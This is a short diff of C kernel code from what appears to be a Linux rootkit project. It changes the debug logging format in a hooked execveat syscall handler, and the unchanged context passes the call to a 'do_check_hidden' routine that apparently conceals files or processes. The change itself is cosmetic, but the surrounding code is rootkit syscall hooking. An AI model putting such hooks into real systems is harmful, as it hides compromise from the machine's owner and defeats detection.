@@ -29,8 +29,8 @@ SYSCALL_HOOK_HANDLER5(execveat, orig_execveat, p_regs, int, i32_dfd, const char 
                       s_filename, const char __user *const __user *, ps_argv,
                       const char __user *const __user *, ps_envp, int, i32_flags)
 {
-    pr_info("[ROOTKIT] execveat(%d, %p, %p, %p, %d)\n", i32_dfd, s_filename, ps_argv, ps_envp,
-            i32_flags);
+    pr_info("[ROOTKIT] execveat(%d, %p, %p, %p, %s%#x)\n", i32_dfd, s_filename, ps_argv, ps_envp,
+            SIGNED_ARG(i32_flags));
 
     return do_check_hidden(orig_execveat, p_regs, i32_dfd, s_filename, i32_flags);
 }
